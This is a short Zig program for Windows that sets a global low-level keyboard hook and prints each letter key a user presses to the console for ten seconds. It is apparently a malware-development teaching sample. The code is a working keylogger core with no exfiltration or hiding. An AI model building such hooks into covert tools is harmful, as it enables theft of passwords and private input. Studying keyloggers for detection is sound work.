const std = @import("std");
const win = @import("zigwin32").everything;

const WPARAM = win.WPARAM;
const LPARAM = win.LPARAM;
const LRESULT = win.LRESULT;
const HHOOK = win.HHOOK;
const MSG = win.MSG;
const KBDLLHOOKSTRUCT = win.KBDLLHOOKSTRUCT;

const WH_MOUSE_LL = win.WH_MOUSE_LL;
const WM_LBUTTONDOWN = win.WM_LBUTTONDOWN;
const WM_RBUTTONDOWN = win.WM_RBUTTONDOWN;
const WM_MBUTTONDOWN = win.WM_MBUTTONDOWN;
const WM_KEYDOWN = win.WM_KEYDOWN;
const WH_KEYBOARD_LL = win.WH_KEYBOARD_LL;

const SetWindowsHookExW = win.SetWindowsHookExW;
const UnhookWindowsHookEx = win.UnhookWindowsHookEx;
const CallNextHookEx = win.CallNextHookEx;
const CreateThread = win.CreateThread;
const WaitForSingleObject = win.WaitForSingleObject;
const GetMessageW = win.GetMessageW;
const GetLastError = win.GetLastError;

var h_keyboard_hook: ?HHOOK = null;

fn hookCallback(code: i32, w_param: WPARAM, l_param: LPARAM) callconv(std.os.windows.WINAPI) LRESULT {
    if (code >= 0 and w_param == WM_KEYDOWN) {
        const kdb: *KBDLLHOOKSTRUCT = @ptrFromInt(@as(usize, @intCast(l_param)));

        const vk_code = kdb.vkCode;

        if ((vk_code >= 'a' and vk_code <= 'z') or (vk_code >= 'A' and vk_code <= 'Z')) {
            std.debug.print("[*] Key Pressed: {c}\n", .{@as(u8, @intCast(vk_code))});
        }
    }

    return CallNextHookEx(null, code, w_param, l_param);
}

fn mouseClickLogger() u32 {
    var msg: MSG = undefined;

    h_keyboard_hook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        hookCallback,
        null,
        0,
    ) orelse {
        std.debug.print("[!] SetWindowsHookExW Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return 0;
    };

    while (GetMessageW(&msg, null, 0, 0) == 1) {}

    return 1;
}

pub fn main() !void {
    const h_thread = CreateThread(
        null,
        0,
        @ptrCast(&mouseClickLogger),
        null,
        .{},
        null,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };

    _ = WaitForSingleObject(h_thread, 10000);

    if (h_keyboard_hook != null and UnhookWindowsHookEx(h_keyboard_hook.?) == 0) {
        std.debug.print("[!] UnhookWindowsHookEx Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.UnhookWindowsHookExFailed;
    }
}
